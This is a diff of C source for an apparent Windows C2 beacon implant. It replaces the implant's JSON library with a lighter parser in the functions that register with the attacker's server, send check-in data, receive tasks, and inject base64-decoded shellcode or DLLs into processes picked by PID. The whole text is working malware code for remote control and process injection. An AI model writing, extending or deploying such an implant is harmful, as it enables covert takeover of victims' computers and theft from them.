@@ -9,26 +9,23 @@
 #include <stdio.h>
 #include <versionhelpers.h>
 
-// so we can parse the json data
-
-#include "../lib/json-c/json.h"
+// json parsers
+#include "../lib/json/jread.h"
+#include "../lib/json/jwrite.h"
 
 // local
-
 #include "base64.h"
 #include "imports.h"
 #include "strings.h"
 #include "compression.h"
 
 // core header file
-
 #include "core.h"
 
 // include settings for callbacks
-
 #include "settings.h"
 
-// Include stdlib function prototypes
+// include stdlib functions
 #include "../lib/stdlib/stdlib.h"
 
 // core functions
@@ -156,7 +153,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
     HMODULE             hWinHTTPdll;
     char*               tmp_decrypted_str;
-    struct json_object *parsed_json;
+    struct jReadElement result;
 
     // create all references to dll functions
     // Load WinHTTP.dll
@@ -304,58 +301,74 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     rWinHttpCloseHandle(hSession);
     rWinHttpCloseHandle(hConnect);
 
-    // now its time to parse the json data in the response
-    parsed_json = json_tokener_parse(ReadBuffer);
+    // clean up the end
+    ReadBuffer[strlen(ReadBuffer) - 1] = '\0';
 
-    // get the id and store it in the idbuffer
-    parsed_json = json_object_object_get(parsed_json, "id");
-    strcpy(IdBuffer, json_object_get_string(parsed_json));
+    // read our id set by the C2
+    jRead(ReadBuffer, "{'id'", &result);
 
-    // Decrement json object reference count
-    json_object_put(parsed_json);
+    // set our global id variable
+    *IdBuffer = '\0';
+    strncat(IdBuffer, result.pValue, result.bytelen);
+    
     // Free WinHTTP.dll
     FreeLibrary(hWinHTTPdll);
+
     return TRUE;
 }
 
 LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
 {
+
     /*
-    Build the reply to the C2 containing any data we need to send back
+    * BuildCheckinData
+    * 
+    * Build data in json format for callback to C2.
+    * 
     */
-    LPCSTR *beaconCheckinData;
-    struct json_object *jobj;
 
-    // init the json object
-    jobj = json_object_new_object();
+    DWORD dwEstSize;
+    CHAR* lpBuffer, *escaped_data = NULL;
+    
+    dwEstSize = lstrlen(Data) + 100;
 
-    // create the id buffer
-    json_object_object_add(jobj, "id", json_object_new_string(IdBuffer));
-
-    // add the correct data to the json data
-    switch (Mode)
+    if (Mode == MODE_CHECKIN_DATA)
     {
-    case MODE_CHECKIN_NO_DATA:
-
-        // don't add any data
-        break;
-
-    case MODE_CHECKIN_DATA:
-
-        // add the opcode and data to the json data
-        json_object_object_add(jobj, "opcode", json_object_new_int64(OpCode));
-        json_object_object_add(jobj, "data", json_object_new_string(Data));
-
-        break;
-
-    default:
-        break;
+        escaped_data = str_replace(Data, "\n", "\\n");
+        escaped_data = str_replace(escaped_data, "\t", "\\t");
+        lpBuffer     = (CHAR*)malloc(dwEstSize + lstrlen(escaped_data));
+    } else
+    {
+        lpBuffer     = (CHAR*)malloc(dwEstSize);
     }
 
-    // return the formatted data
-    beaconCheckinData = (LPCSTR *) _strdup(json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN));
-    json_object_put(jobj);
-    return beaconCheckinData;
+    switch (Mode)
+    {
+        case MODE_CHECKIN_NO_DATA:
+            sprintf(
+                lpBuffer, 
+                "{\"id\":\"%s\"}", 
+                IdBuffer
+            );
+
+            break;
+        case MODE_CHECKIN_DATA:
+            sprintf(
+                lpBuffer, 
+                "{\"id\":\"%s\",\"opcode\":%d,\"data\":\"%s\"}", 
+                IdBuffer, 
+                OpCode, 
+                escaped_data
+            );
+
+            free(escaped_data);
+
+            break;
+        default:
+            break;
+    }
+
+    return (LPCSTR *)lpBuffer;
 }
 
 LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
@@ -372,11 +385,8 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     DWORD               flags;
     HMODULE             hWinHTTPdll;
     char*               tmp_decrypted_str;
-
-    struct json_object *parsed_json;
-    struct json_object *parsed_json_task;
-    struct json_object *parsed_json_args;
-
+    char*               argsBuffer = NULL;
+    struct              jReadElement result;
 
     // create all references to dll functions
     // Load WinHTTP.dll
@@ -554,24 +564,52 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         } while (dwSize > 0);
     }
 
-    // get the opcode
-    parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json_task = json_object_object_get(parsed_json, "task");
-    *OpCode     = json_object_get_int(parsed_json_task);
-
-    parsed_json_args = json_object_object_get(parsed_json, "args");
-    LPCSTR *argsBuffer = NULL;
-    if (parsed_json != NULL)
+    // dont need to bother if we are just sending data
+    if (SendOpCode == DO_CALLBACK)
     {
-        // Copy args json string into return buffer
-        argsBuffer = (LPCSTR *) _strdup(json_object_get_string(parsed_json_args));
+        return TRUE;
     }
-    // Free ResBuffer json object
-    json_object_put(parsed_json);
+
+    // get the opcode
+    INT iOpCode = jRead_int(ResBuffer, "{'task'", JREAD_NUMBER);
+    
+    // set the opcode for the task
+    *OpCode = (DWORD)iOpCode;
+
+    // get the arguments for the task
+    jRead(ResBuffer, "{'args'", &result);
+
+    // clean up the json data to parse to the module
+    if (result.bytelen != 0)
+    {
+        int i, j;
+
+        argsBuffer = (CHAR *)malloc(result.bytelen + 1);
+
+        memcpy(argsBuffer, result.pValue, result.bytelen);
+
+        for(i=0; i<result.bytelen; i++)
+        {
+            if(argsBuffer[i] == '\\')
+            {
+                for(j=i; j<result.bytelen-1; j++)
+                {
+                    argsBuffer[j] = argsBuffer[j+1];
+                }
+    
+                result.bytelen--;
+                argsBuffer[result.bytelen] = '\0';
+    
+                i--;
+            }
+        }
+    }
+    
     // Cleanup handles
     rWinHttpCloseHandle(hRequest);
     rWinHttpCloseHandle(hSession);
     rWinHttpCloseHandle(hConnect);
+    
     return argsBuffer;
 }
 
@@ -588,17 +626,18 @@ BOOL SpawnExecuteCode(char* Base64Buffer)
 
 BOOL InjectExecuteCode(char* Buffer)
 {
-    struct json_object *parsed_json;
+    char* data;
+    struct jReadElement result;
 
     // get pid to inject into
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "pid");
-    int pid = json_object_get_int(parsed_json);
+    int pid = jRead_int(Buffer, "{'pid'", JREAD_NUMBER);
 
-    // get the base64 data to inject
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "data");
-    char* data = json_object_get_string(parsed_json);
+    // get the base64 dll to inject
+    jRead(Buffer, "{'data'", &result);
+
+    // clean up the value
+    data = result.pValue;
+    data[result.bytelen] = '\0';
 
     // decode that base64 data
     size_t out_len   = strlen(data) + 1;
@@ -613,17 +652,18 @@ BOOL InjectExecuteCode(char* Buffer)
 
 BOOL InjectExecuteDll(char* Buffer)
 {
-    struct json_object *parsed_json;
+    char* data;
+    struct jReadElement result;
 
     // get pid to inject into
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "pid");
-    int pid = json_object_get_int(parsed_json);
+    int pid = jRead_int(Buffer, "{'pid'", JREAD_NUMBER);
 
     // get the base64 dll to inject
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "dll");
-    char* data = json_object_get_string(parsed_json);
+    jRead(Buffer, "{'dll'", &result);
+
+    // clean up the value
+    data = result.pValue;
+    data[result.bytelen] = '\0';
 
     // decode that base64 dll
     size_t out_len   = strlen(data) + 1;
@@ -639,16 +679,17 @@ BOOL InjectExecuteDll(char* Buffer)
 BOOL Stdlib(char* Buffer)
 {
     char* data = NULL;
-    DWORD rOpCode;
-    struct json_object *parsed_json;
+    struct jReadElement result;
 
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "op");
-    int op = json_object_get_int(parsed_json);
+    // read the opcode
+    int op = jRead_int(Buffer, "{'op'", JREAD_NUMBER);
 
-    parsed_json = json_tokener_parse(Buffer);
-    parsed_json = json_object_object_get(parsed_json, "args");
-    char* args = json_object_get_string(parsed_json);
+    // read the args
+    jRead(Buffer, "{'args'", &result);
+
+    // clean up the value
+    char* args = result.pValue;
+    args[result.bytelen] = '\0';
 
     switch (op)
     {
@@ -688,7 +729,7 @@ BOOL Stdlib(char* Buffer)
 
     if (data != NULL)
     {
-        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
+        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, NULL, data, DO_CALLBACK, strlen(data));
     }
 
     return TRUE;
